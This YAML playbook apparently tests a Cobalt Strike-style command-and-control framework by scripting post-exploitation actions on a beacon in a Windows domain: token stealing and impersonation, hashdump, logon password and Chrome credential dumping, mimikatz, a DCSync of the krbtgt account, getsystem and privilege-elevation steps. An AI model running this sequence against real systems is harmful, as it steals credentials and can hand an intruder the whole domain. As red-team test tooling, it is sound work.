name: "Phase 3: Credential & Privilege Operations Test"
# beacon_id: ""
# Beacon ID omitted - will prompt for interactive selection
#
# Tests: token operations, kerberos tickets, credential dumping,
#        make_token, steal_token, rev2self, token store, hashdump,
#        logon_passwords, mimikatz, dcsync, chromedump
# Prerequisites: Active beacon with SYSTEM/admin privileges on a
#                domain-joined Windows target
# Risk: MEDIUM - modifies token state, reads credentials
#
# NOTE: Some actions require SYSTEM or admin. Conditions gate them
#       accordingly. If the beacon is not elevated, those actions
#       will be skipped rather than failing.

actions:
  # -------------------------------------------------------
  # Baseline: Who are we?
  # -------------------------------------------------------

  - name: initial_identity
    type: getuid

  # -------------------------------------------------------
  # Token Operations
  # -------------------------------------------------------

  # steal_token from a known process (e.g. winlogon.exe runs as SYSTEM)
  # Find a suitable PID first
  - name: find_winlogon
    type: shell
    parameters:
      command: "tasklist /fi \"imagename eq winlogon.exe\" /fo csv /nh"
    all_of:
      - source: beacon.isAdmin
        operator: equals
        value: "true"

  # Note: In a real test, parse find_winlogon output for the PID.
  # Using a placeholder PID below - replace with actual PID at runtime.
  #
  # - name: steal_winlogon_token
  #   type: steal_token
  #   parameters:
  #     pid: <REPLACE_WITH_WINLOGON_PID>
  #   conditions:
  #     - source: find_winlogon
  #       operator: not_contains
  #       value: "ERROR"

  # make_token with known credentials
  # Replace with valid test credentials for your lab
  - name: make_test_token
    type: make_token
    parameters:
      domain: "YOURDOMAIN"
      user: "youruser"
      password: "yourpassword"

  - name: verify_token
    type: getuid

  # Revert to original token
  - name: revert_token
    type: rev2self

  - name: verify_rev2self
    type: getuid

  # -------------------------------------------------------
  # Token Store Operations
  # -------------------------------------------------------

  - name: list_token_store
    type: token_store_list

  # token_store_steal requires a valid PID
  # Uncomment and set a real PID for testing:
  #
  # - name: store_steal_test
  #   type: token_store_steal
  #   parameters:
  #     pid: <REPLACE_WITH_PID>
  #
  # - name: list_store_after_steal
  #   type: token_store_list
  #
  # - name: store_use_test
  #   type: token_store_use
  #   parameters:
  #     id: 0
  #
  # - name: verify_store_use
  #   type: getuid
  #
  # - name: store_remove_test
  #   type: token_store_remove
  #   parameters:
  #     id: 0

  - name: store_remove_all
    type: token_store_remove_all

  # -------------------------------------------------------
  # Kerberos Ticket Operations
  # -------------------------------------------------------

  # Purge existing tickets (safe on test beacon)
  - name: kerberos_purge
    type: kerberos_ticket_purge

  # kerberos_ticket_use requires a .kirbi file on operator machine
  # Uncomment if you have a ticket:
  #
  # - name: kerberos_use_ticket
  #   type: kerberos_ticket_use
  #   parameters:
  #     ticket: "/tmp/test_ticket.kirbi"

  # -------------------------------------------------------
  # Credential Dumping (requires SYSTEM/admin)
  # -------------------------------------------------------

  - name: hashdump_test
    type: hashdump
    all_of:
      - source: beacon.isAdmin
        operator: equals
        value: "true"

  - name: logon_passwords_test
    type: logon_passwords
    all_of:
      - source: beacon.isAdmin
        operator: equals
        value: "true"

  # Mimikatz with different modes
  - name: mimikatz_normal
    type: mimikatz
    parameters:
      command: "privilege::debug"
      mode: "normal"
    all_of:
      - source: beacon.isAdmin
        operator: equals
        value: "true"

  - name: mimikatz_coffee
    type: mimikatz
    parameters:
      command: "coffee"
      mode: "normal"

  # DCSync requires domain admin or replication rights
  - name: dcsync_test
    type: dcsync
    parameters:
      domain: "yourdomain.local"
      user: "krbtgt"
    all_of:
      - source: beacon.isAdmin
        operator: equals
        value: "true"

  # Chrome credential dump
  - name: chromedump_test
    type: chromedump

  # -------------------------------------------------------
  # make_token_upn (UPN-style authentication)
  # -------------------------------------------------------

  # Uncomment with valid UPN credentials:
  #
  # - name: make_token_upn_test
  #   type: make_token_upn
  #   parameters:
  #     upn: "testuser@corp.local"
  #     password: "TestPassword123!"
  #
  # - name: verify_upn_token
  #   type: getuid
  #
  # - name: revert_upn
  #   type: rev2self

  # -------------------------------------------------------
  # Privilege Elevation
  # -------------------------------------------------------

  # elevate_command and elevate_beacon require specific exploits
  # available on the team server. Uncomment to test:
  #
  # - name: elevate_command_test
  #   type: elevate_command
  #   parameters:
  #     exploit: "svc-exe"
  #     command: "whoami"
  #   conditions:
  #     - source: beacon.isAdmin
  #       operator: equals
  #       value: "false"
  #
  # - name: elevate_beacon_test
  #   type: elevate_beacon
  #   parameters:
  #     exploit: "svc-exe"
  #     listener: "test-http"
  #   conditions:
  #     - source: beacon.isAdmin
  #       operator: equals
  #       value: "false"

  # -------------------------------------------------------
  # getsystem (try if not already SYSTEM)
  # -------------------------------------------------------

  - name: getsystem_test
    type: getsystem
    conditions:
      - source: initial_identity
        operator: not_contains
        value: "SYSTEM"
    on_success:
      - name: verify_system
        type: getuid
    on_failure:
      - name: getsystem_failed
        type: shell
        parameters:
          command: "echo getsystem did not succeed - this is expected if not admin"

  # Final identity check
  - name: final_identity
    type: getuid
